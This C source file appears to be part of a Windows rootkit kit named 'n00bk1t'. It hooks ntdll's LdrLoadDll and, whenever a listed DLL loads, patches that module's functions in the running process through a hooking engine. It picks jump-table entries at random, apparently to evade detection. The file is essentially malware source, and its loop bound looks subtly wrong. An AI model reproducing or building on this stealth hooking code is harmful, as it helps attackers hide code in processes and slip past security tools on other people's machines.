#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "engine.h"
#include "misc.h"
#include "randoma.h"
#include "n00bk1t.h"

#include "ldrloaddll.h"

extern HOOKTABLE*	HookTable;
extern HOOKTABLE	HookTableEnd;
extern DWORD		JMP_TABLE_SIZE;

// ntdll.LdrLoadDll
NTSTATUS WINAPI NewLdrLoadDll(PWCHAR PathToFile,ULONG Flags,PUNICODE_STRING ModuleFileName,PHANDLE ModuleHandle)
{
	NTSTATUS rc;
	LPVOID lpFunction;
	DWORD dwFunctionSize;
	LPVOID lpFunctionAddress;
	INT iRnd,iCount;

	// call original function
	rc=OldLdrLoadDll(PathToFile,Flags,ModuleFileName,ModuleHandle);
	if (NT_SUCCESS(rc))
	{
		for (iCount=0;iCount<sizeof(HookTable)/sizeof(HookTableEnd);iCount++)
		{
			// get module handle
		   	if (engine_NtGetModuleHandleA(HookTable[iCount].lpLibraryName)==*ModuleHandle)
			{
				if (!(*(DWORD*)HookTable[iCount].lpOldFunction))
				{
					// randomize baby !
					iRnd=XIRandom(0,JMP_TABLE_SIZE);

					// place hook
					lpFunction=
						engine_HookFunctionInProcess
						(
							NtCurrentProcess(),
							HookTable[iCount].lpLibraryName,
							HookTable[iCount].lpFunctionName,
							HookTable[iCount].lpNewFunction,
							&dwFunctionSize,
							&lpFunctionAddress,
							iRnd
						);

					if (lpFunction)
					{
						// save address of original function in process
						*(DWORD*)HookTable[iCount].lpOldFunction=(DWORD)lpFunction;
						// save size of original function 
						HookTable[iCount].dwOldFunctionSize=dwFunctionSize;
						// save size of address function
						HookTable[iCount].lpFunctionAddress=lpFunctionAddress;
					}
				}
			}
		}
	}

	return rc;
}
